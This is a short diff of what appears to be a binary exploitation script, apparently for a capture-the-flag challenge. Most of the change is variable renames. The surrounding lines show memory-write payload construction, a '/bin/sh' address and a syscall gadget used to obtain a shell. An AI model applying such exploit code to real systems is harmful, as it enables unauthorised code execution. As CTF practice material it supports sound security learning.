@@ -69,9 +69,9 @@ S__bin_sh = 0x41430
 
 I__syscall = 0x0000000000041015
 
-g_add_addf_base = 0x41000
-g_add_addf = [(195, 1)]
-g_add_addr = 0x410c3
+g_ret_addf_base = 0x41000
+g_ret_addf = [(195, 1)]
+g_ret_addr = 0x410c3
 max_ccnumj = 50
 
 # g_patch_addf_base = 0x41000
@@ -105,7 +105,7 @@ def m_byte(addr, num, delay=0):
         print(cnum)
         ccnum = cnum if cnum <= max_ccnumj else max_ccnumj
         cnum -= ccnum
-        ja = g_add_addr - ccnum * 2
+        ja = g_ret_addr - ccnum * 2
         print(f"{cnum} {ccnum} {hex(ja)}")
 
         payload = b''
@@ -136,7 +136,7 @@ def m_bytes(addf, base, func, delay=0):
 
 io = start()
 
-m_bytes(g_add_addf, g_add_addf_base, m_byte_p, 0)
+m_bytes(g_ret_addf, g_ret_addf_base, m_byte_p, 0)
 m_bytes(g_shell_addf, g_shell_addf_base, m_byte, 0)
 
 payload = b''
